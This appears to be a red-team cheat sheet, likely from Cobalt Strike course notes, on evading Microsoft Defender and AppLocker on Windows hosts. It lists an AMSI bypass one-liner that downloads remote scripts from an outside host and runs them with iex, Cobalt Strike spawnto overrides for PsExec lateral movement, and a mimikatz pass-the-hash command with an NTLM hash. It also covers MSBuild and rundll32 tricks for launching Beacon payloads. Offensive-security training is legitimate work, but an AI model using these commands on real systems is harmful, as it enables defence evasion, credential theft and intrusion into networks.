## Microsoft Defender AV 
Enumerate the host for AV 
```
remote-exec winrm fs Get-MpThreatDetection
```

Manual AMSI bypass
```
iex (new-object net.webclient).downloadstring("http://nickelviper.com/bypass.txt"); iex (new-object net.webclient).downloadstring("http://nickelviper.com/a")
```

Behavioral Detections 
```
#Override spawnto setting in C2 for PsExec
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
jump psexec64 fs smb

ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
jump psexec fs smb
```

Command Line Detections 
```
mimikatz sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe
```

<br>
<br>

## Application Whitelisting 
Enumerate the host for AppLocker 
```
powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath
powershell $ExecutionContext.SessionState.LanguageMode
```

Using Writable Directories (Ex. C:\Windows\Tasks) 
```
powershell Get-Acl C:\Windows\Tasks | fl (check permissions)
```

LOLBins - MSBuild
```
use http_x64.xprocess.bin here and host it on the Cobalt Strike Team Server via Site Management > Host File
```

PowerShell CLM - Unmanaged Runspace
```
# Beacon DLL (DLLs are usually not restricted by Applocker due to performance reason)
C:\Windows\System32\rundll32.exe http_x64.dll,StartW
```

Other Resources 

https://sp00ks-git.github.io/posts/CLM-Bypass/
